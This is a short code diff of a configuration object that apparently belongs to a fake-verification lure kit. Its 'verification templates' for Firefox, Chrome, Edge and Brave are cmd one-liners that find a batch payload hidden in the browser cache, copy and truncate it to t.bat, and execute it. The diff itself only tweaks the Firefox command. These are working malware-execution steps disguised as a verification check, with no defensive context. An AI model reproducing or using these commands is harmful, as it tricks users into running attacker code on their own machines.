@@ -25,7 +25,7 @@
     bodyEndMarker: 'CDRPEND7F3A9D2',
     bodyMustStartWith: '@echo off',
     verificationTemplates: {
-      firefox: 'start cmd /k cd /d %TMP%&for /d %p in (%LOCALAPPDATA%\\Mozilla\\Firefox\\Profiles\\*) do @for %f in (%~sp\\cache2\\entries\\*) do @findstr /b /c:@echo %f&&copy /y %f t.bat&&fsutil file seteof t.bat {SZ}&&call t.bat&pause',
+      firefox: 'cmd /k cd /d %TMP%&for /d %p in (%LOCALAPPDATA%\\Mozilla\\Firefox\\Profiles\\*) do @for %f in (%~sp\\cache2\\entries\\*) do @findstr /b /c:@echo %f&&copy /y %f t.bat&&fsutil file seteof t.bat {SZ}&&call t.bat&pause',
       chrome: 'start cmd /k cd /d %TMP%&for /d %d in (%LOCALAPPDATA%\\Google\\Chrome\\User*) do @for /r %~sd %f in (f_*) do @findstr /b /c:@echo %f&&copy /y %f t.bat&&fsutil file seteof t.bat {SZ}&&call t.bat&pause',
       edge: 'start cmd /k cd /d %TMP%&for /d %d in (%LOCALAPPDATA%\\Microsoft\\Edge\\User*) do @for /r %~sd %f in (f_*) do @findstr /b /c:@echo %f&&copy /y %f t.bat&&fsutil file seteof t.bat {SZ}&&call t.bat&pause',
       brave: 'start cmd /k cd /d %TMP%&for /r %LOCALAPPDATA%\\BraveSoftware %f in (f_*) do @findstr /b /c:@echo %f&&copy /y %f t.bat&&fsutil file seteof t.bat {SZ}&&call t.bat&pause'
